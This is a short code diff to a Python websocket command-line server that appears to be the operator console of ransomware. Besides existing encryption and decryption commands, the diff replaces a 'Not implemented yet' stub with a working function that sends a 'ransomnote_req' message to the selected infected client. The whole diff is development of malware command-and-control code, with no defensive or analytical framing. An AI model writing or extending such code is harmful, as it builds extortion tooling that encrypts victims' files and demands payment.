@@ -122,7 +122,6 @@ class WebSocketCLIServer:
                     await self.__send_encryption_req()
 
                 case ["ransomnotereq"]:
-                    print("Not implemented yet")
                     await self.__send_ransom_note_req()
 
                 case ["decryptrep"]:
@@ -240,8 +239,11 @@ class WebSocketCLIServer:
     @check_selected_client
     async def __send_ransom_note_req(self):
         """Send a ransom note request to the selected client."""
-        #TODO: Implement ransom note request
-        pass
+        message = {
+            "type": "ransomnote_req",
+            "data": {}
+        }
+        await self.__selected_client.send_message(json.dumps(message))
 
     @check_selected_client
     async def __send_decrypt_rep(self):
